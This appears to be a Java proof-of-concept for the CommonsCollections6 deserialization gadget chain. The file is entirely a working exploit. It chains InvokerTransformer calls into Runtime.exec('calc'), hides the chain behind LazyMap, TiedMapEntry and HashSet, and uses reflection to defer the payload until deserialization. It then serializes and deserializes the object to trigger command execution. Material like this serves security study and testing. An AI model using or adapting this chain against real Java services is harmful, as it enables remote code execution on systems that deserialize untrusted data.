package org.dili.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class commons_collections6 {
    public static void main(String[] args) throws Exception{
        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,Testtransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");

        HashSet hashSet=new HashSet(1);
        hashSet.add(tiedMapEntry);
        lazyMap.remove("test1");

        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(Testtransformer, transformers);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        objectOutputStream.writeObject(hashSet);
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.out"));
        objectInputStream.readObject();
    }
}

